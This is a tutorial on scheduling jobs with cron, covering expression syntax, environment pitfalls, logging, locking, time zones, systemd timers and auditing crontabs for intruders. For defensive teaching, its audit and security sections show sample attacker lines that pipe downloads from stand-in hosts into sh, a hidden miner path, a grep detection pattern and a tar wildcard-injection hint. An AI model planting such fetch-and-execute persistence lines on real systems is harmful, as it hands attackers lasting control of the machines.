<Callout type="tip" title="In one minute">
**cron** runs commands on a schedule. Each **crontab** line has five time fields — **minute hour day-of-month month day-of-week** — then the command: `30 2 * * * /usr/local/bin/backup.sh` = every day at 02:30. Edit your jobs with `crontab -e`, list them with `crontab -l`. Cron uses a **minimal environment**, so use **absolute paths** and **redirect output** to a log (`>> /var/log/job.log 2>&1`). Prevent overlapping runs with `flock`. `*/5` means "every 5". systemd **timers** are the modern alternative with better logging.
</Callout>

## Start from zero

### Jobs that must happen by themselves

Backups every night, a cleanup every hour, a report every Monday, a certificate renewal every few weeks — nobody should have to remember to type these.

<Callout type="analogy">
An **alarm clock with a to-do note** attached: "every day at 2:30 — take the backup", "every Monday at 7:00 — send the weekly report". cron is a tireless assistant that checks the clock **every minute** and does whatever note matches that minute.
</Callout>

### Words you need first

| Word | Simple meaning | Example |
| --- | --- | --- |
| **cron** | The scheduler service (daemon: `cron` / `crond`) | |
| **crontab** | A table of scheduled jobs (also the command to edit it) | `crontab -e` |
| **Cron expression** | The five time fields | `30 2 * * *` |
| **`*`** | "every" value of that field | every hour |
| **`*/n`** | every n | `*/15` = every 15 minutes |
| **`a-b`** | a range | `1-5` = Monday to Friday |
| **`a,b`** | a list | `0,30` = at :00 and :30 |
| **Timer** | systemd's scheduled job | `backup.timer` |

## What is it?

```text
┌───────────── minute        (0 - 59)
│ ┌─────────── hour          (0 - 23)
│ │ ┌───────── day of month  (1 - 31)
│ │ │ ┌─────── month         (1 - 12)
│ │ │ │ ┌───── day of week   (0 - 7, Sunday = 0 or 7)
│ │ │ │ │
* * * * *   command to run
```

| Expression | Runs |
| --- | --- |
| `* * * * *` | Every minute |
| `*/5 * * * *` | Every 5 minutes |
| `0 * * * *` | At the start of every hour |
| `30 2 * * *` | Every day at 02:30 |
| `0 9 * * 1-5` | 09:00, Monday to Friday |
| `0 7 * * 1` | Mondays at 07:00 |
| `0 0 1 * *` | Midnight on the 1st of every month |
| `15 3 * * 0` | Sundays at 03:15 |
| `0 */6 * * *` | Every 6 hours (00:00, 06:00, 12:00, 18:00) |
| `@reboot` | Once, at system start-up |
| `@daily`, `@hourly`, `@weekly` | Shortcuts |

## Why does it matter?

- **Backups, cleanup, reports, renewals, syncs** — every server has scheduled work.
- **Silent failures:** a broken cron job fails every night without anyone noticing unless it logs and alerts.
- **Security:** attackers love cron for **persistence** — a hidden line that re-downloads malware every minute. Auditing crontabs is a standard incident-response step.

## When and where do you use it?

| Need | Where |
| --- | --- |
| Your own job as your user | `crontab -e` |
| A system job for an app | `/etc/cron.d/<app>` |
| Simple daily/weekly script | `/etc/cron.daily/`, `/etc/cron.weekly/` |
| Modern alternative with logs | systemd timer |
| In Kubernetes | `CronJob` resource (same five-field syntax!) |
| In GitHub Actions | `on: schedule: - cron: "30 2 * * *"` (same syntax, UTC) |

## Concepts one by one

### 1. Reading cron expressions

<Explain>
<What>
Five fields that describe when a job runs. The job runs when **all** fields match the current time (with one exception: if both day-of-month and day-of-week are set, either may match).
</What>
<Why>
A wrong field means a job runs every minute instead of once a day — or never.
</Why>
<When>
Writing and reviewing every cron line.
</When>
<Where>
Crontabs, Kubernetes CronJobs, GitHub Actions, AWS EventBridge (similar).
</Where>
<How>
Read left to right: minute, hour, day, month, weekday. Check with a tool like crontab.guru.
</How>
</Explain>

```bash
explain() {
  read -r m h dom mon dow <<< "$1"
  printf '%-14s → minute=%s hour=%s day=%s month=%s weekday=%s\n' "$1" "$m" "$h" "$dom" "$mon" "$dow"
}
explain "30 2 * * *"
explain "*/15 * * * *"
explain "0 9 * * 1-5"
```

```text output
30 2 * * *     → minute=30 hour=2 day=* month=* weekday=*
*/15 * * * *   → minute=*/15 hour=* day=* month=* weekday=*
0 9 * * 1-5    → minute=0 hour=9 day=* month=* weekday=1-5
```

<Callout type="warning" title="The classic mistake">
`* 2 * * *` does **not** mean "at 2 a.m." — it means "**every minute** from 02:00 to 02:59" (60 runs). For once at 2 a.m., write `0 2 * * *`.
</Callout>

### 2. Editing and listing your crontab

<Explain>
<What>
Each user has their own crontab, edited with the `crontab` command.
</What>
<Why>
`crontab -e` checks the syntax and installs the file correctly; editing the spool files directly is not supported.
</Why>
<When>
Adding, changing or removing your scheduled jobs.
</When>
<Where>
Stored under `/var/spool/cron/` (do not edit there).
</Where>
<How>
`crontab -e` (edit), `crontab -l` (list), `crontab -r` (remove **all** — careful, no confirmation), `sudo crontab -u www-data -l` (another user's).
</How>
</Explain>

```bash
printf '%s\n' "# m h dom mon dow command" "30 2 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1" > mycron.txt
crontab mycron.txt
crontab -l
crontab -r
crontab -l 2>&1 | sed 's/^no crontab for .*/no crontab installed any more/'
```

```text output
# m h dom mon dow command
30 2 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1
no crontab installed any more
```

`crontab file` installs a file as your whole crontab — handy in scripts. `crontab -e` does the same through an editor.

### 3. System cron: `/etc/cron.d` and friends

<Explain>
<What>
System-wide cron files. They have an extra **user** field after the five time fields.
</What>
<Why>
Packages and admins install jobs here, separate from personal crontabs, and they can be managed by config tools and kept in Git.
</Why>
<When>
Jobs for applications and the system.
</When>
<Where>
`/etc/crontab`, `/etc/cron.d/*`, plus `/etc/cron.hourly|daily|weekly|monthly/` (scripts run by `run-parts`).
</Where>
<How>
File names in `/etc/cron.d` must not contain dots; the file must end with a newline.
</How>
</Explain>

```text
# /etc/cron.d/shop
SHELL=/bin/bash
PATH=/usr/local/bin:/usr/bin:/bin
MAILTO=""

# m  h  dom mon dow  user      command
30   2  *   *   *    shopapp   /usr/local/bin/backup.sh /var/www/shop /mnt/backups 14 >> /var/log/shop-backup.log 2>&1
*/5  *  *   *   *    root      /usr/local/bin/healthcheck.sh >> /var/log/health.log 2>&1
```

### 4. The cron environment

<Explain>
<What>
Cron starts jobs with a very small environment: a short PATH, `HOME` of the user, `SHELL=/bin/sh`, and **none** of your `~/.bashrc` settings.
</What>
<Why>
"It works when I run it, but not from cron" — almost always PATH, a relative path, or a missing variable.
</Why>
<When>
Every cron job.
</When>
<Where>
cron runs commands with `/bin/sh` unless `SHELL=` is set.
</Where>
<How>
Use **absolute paths** for commands and files, set `PATH=` at the top of the crontab, and `cd` into the right folder in the script.
</How>
</Explain>

```bash
env -i PATH=/usr/bin:/bin HOME=/nonexistent /bin/sh -c 'echo "PATH=$PATH"; echo "PWD=$PWD" | sed "s|=.*|=<wherever cron starts>|"; command -v node > /dev/null && echo "node found" || echo "node NOT found in this PATH"'
```

```text output
PATH=/usr/bin:/bin
PWD=<wherever cron starts>
node NOT found in this PATH
```

Node.js installed with nvm lives in `~/.nvm/…` — cron cannot find it unless you use the full path (`/home/alex/.nvm/versions/node/v22.11.0/bin/node`) or set PATH.

### 5. Logging output and errors

<Explain>
<What>
Saving everything a job prints to a log file.
</What>
<Why>
Cron jobs have no screen. Without a log, failures are invisible (by default cron tries to **email** output to the user, which usually goes nowhere).
</Why>
<When>
Every cron job.
</When>
<Where>
`/var/log/<job>.log`, or the journal with `logger`/`systemd-cat`.
</Where>
<How>
Append both streams: `>> /var/log/job.log 2>&1`. Add timestamps inside the script. Rotate the log with logrotate.
</How>
</Explain>

```bash
job() { echo "[$(date -d '2026-11-10 02:30' '+%F %T')] backup started"; ls /no/such/dir; echo "[$(date -d '2026-11-10 02:31' '+%F %T')] backup finished"; }
job >> job.log 2>&1
cat job.log
```

```text output
[2026-11-10 02:30:00] backup started
ls: cannot access '/no/such/dir': No such file or directory
[2026-11-10 02:31:00] backup finished
```

Both the normal messages and the error ended up in the log — without `2>&1` the error would have been lost.

### 6. `%` is special in crontab lines

<Explain>
<What>
In a crontab line, an unescaped `%` means "new line" and everything after it is sent as input to the command.
</What>
<Why>
`date +%F` inside a crontab line silently breaks the command.
</Why>
<When>
Any crontab command containing `%` (dates in file names!).
</When>
<Where>
Crontab files (not inside scripts).
</Where>
<How>
Escape it as `\%`, or — better — move the command into a script and call the script from cron.
</How>
</Explain>

```text
# Broken:  0 2 * * * tar -czf /backups/site-$(date +%F).tgz /var/www/site
# Fixed:   0 2 * * * tar -czf /backups/site-$(date +\%F).tgz /var/www/site
# Best:    0 2 * * * /usr/local/bin/backup-site.sh
```

### 7. Preventing overlapping runs

<Explain>
<What>
Making sure a new run does not start while the previous one is still running.
</What>
<Why>
A job scheduled every 5 minutes that sometimes takes 7 minutes will pile up copies, fight over files and overload the server.
</Why>
<When>
Any job whose runtime can exceed its interval.
</When>
<Where>
Syncs, imports, backups, report generation.
</Where>
<How>
Wrap the command with `flock -n /tmp/job.lock command` — if the lock is held, the new run exits immediately.
</How>
</Explain>

```bash
flock -n /tmp/demo-job.lock sleep 2 &
sleep 0.3
flock -n /tmp/demo-job.lock echo "second run" || echo "second run skipped: previous run still holds the lock"
wait
flock -n /tmp/demo-job.lock echo "third run: lock free again, job runs"
```

```text output
second run skipped: previous run still holds the lock
third run: lock free again, job runs
```

Crontab line: `*/5 * * * * flock -n /tmp/sync.lock /usr/local/bin/sync.sh >> /var/log/sync.log 2>&1`.

### 8. Time zones

<Explain>
<What>
Cron uses the **server's** time zone (often UTC on cloud servers). GitHub Actions and many cloud schedulers always use UTC.
</What>
<Why>
"Run at 2 a.m." on a UTC server is 7 a.m. in a UTC+5 city such as Tashkent — maybe during business hours.
</Why>
<When>
Every schedule that must happen at a local time.
</When>
<Where>
`timedatectl` shows the server's time zone.
</Where>
<How>
Convert the time to the server's zone, or set `CRON_TZ=Asia/Tashkent` at the top of the crontab (supported by cronie and recent Debian/Ubuntu cron).
</How>
</Explain>

```bash
TZ=UTC date -d 'TZ="Asia/Tashkent" 2026-11-10 02:00' '+02:00 in Tashkent is %H:%M UTC'
```

```text output
02:00 in Tashkent is 21:00 UTC
```

So for 02:00 local time (UTC+5) on a UTC server, write `0 21 * * *` (and remember it runs on the **previous** UTC day).

### 9. One-off jobs: `at`

<Explain>
<What>
`at` runs a command **once** at a given time.
</What>
<Why>
"Restart the service at 23:00 tonight" or "remove this temporary firewall rule in 30 minutes".
</Why>
<When>
One-time scheduled tasks.
</When>
<Where>
Package `at` (daemon `atd`).
</Where>
<How>
`echo "systemctl restart shop" | sudo at 23:00`, `atq` (list), `atrm N` (remove).
</How>
</Explain>

```text
$ echo "/usr/local/bin/cleanup.sh" | at now + 30 minutes
job 7 at Mon Nov 10 15:05:00 2026
$ atq
7	Mon Nov 10 15:05:00 2026 a alex
```

### 10. systemd timers: the modern alternative

<Explain>
<What>
A `.timer` unit that triggers a `.service` unit on a schedule (see **systemd and Services**).
</What>
<Why>
Logs in the journal automatically, catch-up of missed runs (`Persistent=true`), no overlapping by default, randomised delays, and all systemd security options.
</Why>
<When>
New scheduled jobs on systemd servers — especially important ones.
</When>
<Where>
`/etc/systemd/system/*.timer`; list with `systemctl list-timers`.
</Where>
<How>
`OnCalendar=*-*-* 02:30:00` (daily 02:30), `OnCalendar=Mon *-*-* 07:00:00`, `OnCalendar=hourly`. Check an expression: `systemd-analyze calendar "Mon *-*-* 07:00"`.
</How>
</Explain>

| | cron | systemd timer |
| --- | --- | --- |
| Setup | One line | Two small files |
| Logs | Only if you redirect | Automatic (journal) |
| Missed runs (server was off) | Lost | `Persistent=true` catches up |
| Overlap protection | Use `flock` | Built in |
| Available | Everywhere, incl. minimal systems | systemd systems |

### 11. Auditing cron for attackers

<Explain>
<What>
Checking every place a scheduled job can hide.
</What>
<Why>
Cron is one of the most common **persistence** techniques after a break-in (MITRE ATT&CK T1053.003): a line that re-installs a miner or reverse shell every few minutes.
</Why>
<When>
Incident response, routine security audits.
</When>
<Where>
All users' crontabs, `/etc/crontab`, `/etc/cron.d/`, `/etc/cron.*/`, systemd timers, `at` jobs.
</Where>
<How>
List them all and look for downloads (`curl`/`wget` piped to `sh`), base64 blobs, hidden paths (`/tmp/.x`, `/dev/shm`), and jobs for unexpected users.
</How>
</Explain>

```bash
printf '%s\n' \
  '30 2 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1' \
  '*/2 * * * * curl -fsSL http://198.51.100.9/x.sh | sh' \
  '@reboot /dev/shm/.kworker -c pool.example:3333' \
  '0 7 * * 1 /usr/local/bin/report.sh' > suspicious-crontab.txt
grep -nE 'curl|wget|base64|/dev/shm|/tmp/\.|\| *(ba)?sh' suspicious-crontab.txt | sed 's/^/SUSPICIOUS line /'
```

```text output
SUSPICIOUS line 2:*/2 * * * * curl -fsSL http://198.51.100.9/x.sh | sh
SUSPICIOUS line 3:@reboot /dev/shm/.kworker -c pool.example:3333
```

A full audit on a server (as root):

```text
for u in $(cut -d: -f1 /etc/passwd); do crontab -u "$u" -l 2>/dev/null | sed "s/^/[$u] /"; done
cat /etc/crontab; ls -la /etc/cron.d /etc/cron.*/
systemctl list-timers --all
atq
```

## Hands-on

```bash
# 1. Write a job script that is cron-safe
cat > report.sh <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
PATH=/usr/local/bin:/usr/bin:/bin
cd "$(dirname "$0")"
echo "[$(date '+%F %T')] report: $(ls | wc -l) files here"
EOF
chmod +x report.sh

# 2. Run it the way cron would: minimal environment, output appended to a log
env -i /bin/sh -c "$PWD/report.sh >> $PWD/report.log 2>&1"
env -i /bin/sh -c "$PWD/report.sh >> $PWD/report.log 2>&1"
wc -l < report.log | sed 's/$/ runs logged/'
sed -E 's/\[[0-9-]+ [0-9:]+\]/[DATE TIME]/; s/: [0-9]+ files/: N files/' report.log | head -1

# 3. The crontab line you would install
echo "*/10 * * * * flock -n /tmp/report.lock $PWD/report.sh >> $PWD/report.log 2>&1" | sed "s|$PWD|/opt/jobs|g"
```

```text output
2 runs logged
[DATE TIME] report: N files here
*/10 * * * * flock -n /tmp/report.lock /opt/jobs/report.sh >> /opt/jobs/report.log 2>&1
```

## Real-world example

A VPS runs a Node.js API with PostgreSQL. The team's scheduled jobs, all in `/etc/cron.d/app` and each backed by a script with logging and locking:

```text
SHELL=/bin/bash
PATH=/usr/local/bin:/usr/bin:/bin
MAILTO=""

# Every 10 min: expire old sessions (never two at once)
*/10 * * * *  app     flock -n /run/lock/sessions.lock /srv/app/bin/expire-sessions.sh 2>&1 | logger -t expire-sessions

# 02:30 daily: database backup to S3, then delete local copies older than 3 days
30 2 * * *    backup  /usr/local/bin/backup-db.sh 2>&1 | logger -t backup-db

# 04:00 Sundays: prune unused Docker images
0 4 * * 0     root    /usr/bin/docker image prune -af --filter "until=168h" 2>&1 | logger -t docker-prune
```

The important part is what happens when a job **fails**: the backup script ends by pinging a "dead man's switch" monitoring URL (Healthchecks.io, Cronitor, or a CloudWatch metric). If the ping does not arrive by 03:30, someone is alerted. Silent backup failures are discovered only when you need the backup — that monitoring is what turns a schedule into a reliable control.

## Common mistakes

- **Relying on your shell's PATH** — use absolute paths or set `PATH` at the top of the crontab.
- **No output redirection**, so errors vanish.
- **Unescaped `%`** in crontab lines.
- **Overlapping runs** without `flock`.
- **Wrong time zone** assumptions on UTC servers.
- **`crontab -r`** instead of `-e` — deletes everything without asking. Keep crontabs in Git / config management.
- **Running everything as root** "because it was easier".
- **No monitoring** — a job that silently stopped months ago.

## Security lens

<Callout type="security">
Scheduled jobs run unattended, often as root, forever. That makes them perfect for attackers — and important for defenders to audit.
</Callout>

- **Persistence:** adding a line to a crontab (`* * * * * curl http://evil/x | sh`) is one of the most common ways attackers survive reboots and cleanups — the cryptominer from "Processes and Signals" typically comes back this way. Audit all user crontabs, `/etc/crontab`, `/etc/cron.*`, and systemd timers; alert on changes.
- **Writable scripts run by root:** if a root cron job runs `/opt/scripts/cleanup.sh` and a normal user can edit that file (or its directory), that user can become root. Check owners and modes of everything root's jobs execute.
- **Wildcard injection:** a root job like `cd /uploads && tar czf /backup/u.tgz *` can be abused by creating files named like options (`--checkpoint-action=exec=...`). Use `--` and explicit paths.
- **PATH hijacking:** a job without absolute paths whose `PATH` includes a writable directory can be tricked into running a fake binary.
- **Restrict who can use cron** with `/etc/cron.allow` and `/etc/cron.deny` on shared servers.
- **Secrets in crontab lines** are visible to anyone who can read the crontab and in process listings while the job runs. Load them inside the script from a protected file or secrets manager.
- **Backups and patching are scheduled jobs** — monitor that they succeed; missed security updates and failed backups are real risks.

## Interview questions

<QA q="What does the cron expression 0 */6 * * 1-5 mean?">
At minute 0 of every sixth hour (00:00, 06:00, 12:00, 18:00), on Monday through Friday, every month. The fields are minute, hour, day of month, month and day of week.
</QA>

<QA q="A script works when you run it manually but fails from cron. What do you check?">
Cron runs with a minimal environment: a short PATH, no shell profile, /bin/sh instead of bash, a different working directory and no TTY. Check that the script uses absolute paths or sets PATH, has a correct shebang and is executable, does not rely on variables from .bashrc, escapes % in the crontab line, and redirect output to a log to see the actual error. Also confirm the job ran at all in the cron logs, and check the user and time zone.
</QA>

<QA q="How do you prevent a cron job from running twice at the same time?">
Wrap it with a lock, most simply `flock -n /path/to/lockfile command`, which exits if the previous run still holds the lock. Alternatively use a systemd timer (a service will not be started again while running) or a Kubernetes CronJob with concurrencyPolicy: Forbid.
</QA>

<QA q="How do attackers use cron, and how would you detect it?">
They add entries to user or system crontabs, or drop scripts into /etc/cron.d or the cron.daily-style directories, to re-run malware periodically and survive reboots. Detect it by inventorying all crontabs and timers, monitoring those files and directories for changes, alerting on cron jobs that download and execute content or run from /tmp, and reviewing cron execution logs.
</QA>

<QA q="When would you choose a systemd timer or a Kubernetes CronJob over cron?">
Use a systemd timer when you want automatic logging in the journal, dependency ordering, resource limits, sandboxing, catch-up after downtime and protection against overlapping runs on a single server. Use a Kubernetes CronJob or a cloud scheduler when workloads run in a cluster or serverless environment, so the job does not depend on a single machine and gets retries, history and concurrency policies.
</QA>

## Key terms

<Terms>
  <Term name="cron">Daemon that runs commands on a schedule.</Term>
  <Term name="crontab">A file of scheduled jobs, or the command that edits it.</Term>
  <Term name="Cron expression">Five fields — minute, hour, day of month, month, day of week.</Term>
  <Term name="@reboot">Special schedule that runs once at startup.</Term>
  <Term name="flock">Utility that uses a lock file to prevent concurrent runs.</Term>
  <Term name="anacron">Runs missed daily/weekly jobs on machines that are not always on.</Term>
  <Term name="systemd timer">systemd's scheduler, an alternative to cron.</Term>
  <Term name="Dead man's switch">Monitoring that alerts when an expected job check-in does not arrive.</Term>
  <Term name="Persistence">Attacker techniques for keeping access across reboots and cleanup.</Term>
</Terms>
